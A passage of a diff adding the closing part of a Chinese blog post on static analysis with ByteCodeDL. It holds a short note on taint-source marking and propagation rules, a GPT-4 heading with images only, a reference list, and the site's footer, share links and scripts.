+<p>&gt;<br>&gt;</p>
+<blockquote>
+<p>大致操作：</p>
+<ol>
+<li>先标记出来污点源（对于一些带有注解的函数，还需要添加注解支持，soot-generator 是可以生成的）</li>
+<li>构建污点传递规则</li>
+</ol>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230408172007373.png" alt="image-20230408172007373"></p>
+</blockquote>
+<h4 id="9-GPT-4"><a href="#9-GPT-4" class="headerlink" title="9. GPT-4"></a>9. GPT-4</h4><p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230405164825673.png" alt="image-20230405164825673" style="zoom:50%;"></p>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230408172213115.png" alt="image-20230408172213115" style="zoom:50%;"></p>
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p>[1] <a target="_blank" rel="noopener" href="https://y4er.com/posts/bytecodedl/#ptaptaint-analysis">https://y4er.com/posts/bytecodedl/#ptaptaint-analysis</a></p>
+<p>[2] <a target="_blank" rel="noopener" href="https://tttang.com/archive/1541/#toc_0x02-example-2">https://tttang.com/archive/1541/#toc_0x02-example-2</a></p>
+<p>[3] <a target="_blank" rel="noopener" href="https://ranger-nju.gitbook.io/static-program-analysis-book/ch3/pointer-analysis/03-02-pointer2-analysis-spa#handling-of-new-and-assign">https://ranger-nju.gitbook.io/static-program-analysis-book/ch3/pointer-analysis/03-02-pointer2-analysis-spa#handling-of-new-and-assign</a></p>
+<p>[4] <a target="_blank" rel="noopener" href="https://github.com/BytecodeDL/ByteCodeDL/discussions">https://github.com/BytecodeDL/ByteCodeDL/discussions</a></p>
+<p>[5] <a target="_blank" rel="noopener" href="https://y4er.com/posts/bytecodedl/#ptaptaint-analysis">https://y4er.com/posts/bytecodedl/#ptaptaint-analysis</a></p>
+<p>[6] <a target="_blank" rel="noopener" href="https://yanniss.github.io/ptaint-oopsla17-prelim.pdf">https://yanniss.github.io/ptaint-oopsla17-prelim.pdf</a></p>
+<p>[7] <a target="_blank" rel="noopener" href="https://tttang.com/archive/1510/">https://tttang.com/archive/1510/</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E4%B9%8B-ByteCodeDL-%E7%AF%87"><span class="toc-number">1.</span> <span class="toc-text">静态分析实战 之 ByteCodeDL 篇</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-number">1.0.1.</span> <span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Pre-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.0.2.</span> <span class="toc-text">Pre. 前置知识</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0-%E5%86%85%E7%BD%AE%E8%B0%93%E8%AF%8D%E7%9A%84%E5%88%A9%E7%94%A8-%E2%80%94%E2%80%94-%E6%9F%A5%E6%89%BE%E7%89%B9%E5%AE%9A%E6%9D%A1%E4%BB%B6%E7%9A%84%E7%B1%BB"><span class="toc-number">1.0.3.</span> <span class="toc-text">0. 内置谓词的利用 ——  查找特定条件的类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%AE%9E%E7%8E%B0-%E3%80%8CClass-Hierarchy%E3%80%8D"><span class="toc-number">1.0.4.</span> <span class="toc-text">1. 实现 「Class Hierarchy」</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-CHA-%E4%BC%98%E5%8C%96"><span class="toc-number">1.0.5.</span> <span class="toc-text">2. CHA 优化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-CHA-%E5%BA%94%E7%94%A8"><span class="toc-number">1.0.6.</span> <span class="toc-text">3. CHA 应用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#0x1-buggyLoader-0ctf-2021-final"><span class="toc-number">1.0.6.1.</span> <span class="toc-text">0x1. buggyLoader 0ctf-2021-final</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x2-ezchain-hf-ctf-2022"><span class="toc-number">1.0.6.2.</span> <span class="toc-text">0x2. ezchain hf-ctf-2022</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90"><span class="toc-number">1.0.7.</span> <span class="toc-text">4. 上下文无关指针分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-pta-ptaint-Analysis"><span class="toc-number">1.0.8.</span> <span class="toc-text">5. pta&#x2F;ptaint Analysis</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-Demo-%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.0.9.</span> <span class="toc-text">6. Demo 复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E6%A1%88%E4%BE%8B%E5%AD%A6%E4%B9%A0-%E4%BD%BF%E7%94%A8ByteCodeDL%E5%88%86%E6%9E%90%E9%95%BF%E5%9F%8E%E6%9D%AFCTF-b4bycoffee"><span class="toc-number">1.0.10.</span> <span class="toc-text">7. [案例学习] 使用ByteCodeDL分析长城杯CTF b4bycoffee</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-GPT-4"><span class="toc-number">1.0.11.</span> <span class="toc-text">9. GPT-4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.0.12.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/&text=静态分析实战 之 ByteCodeDL 篇"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/&title=静态分析实战 之 ByteCodeDL 篇"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/&is_video=false&description=静态分析实战 之 ByteCodeDL 篇"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=静态分析实战 之 ByteCodeDL 篇&body=Check out this article: https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/&title=静态分析实战 之 ByteCodeDL 篇"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/&title=静态分析实战 之 ByteCodeDL 篇"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/&title=静态分析实战 之 ByteCodeDL 篇"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/&title=静态分析实战 之 ByteCodeDL 篇"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/&name=静态分析实战 之 ByteCodeDL 篇&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://racerz-fighting.github.io/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/&t=静态分析实战 之 ByteCodeDL 篇"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    RacerZ
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
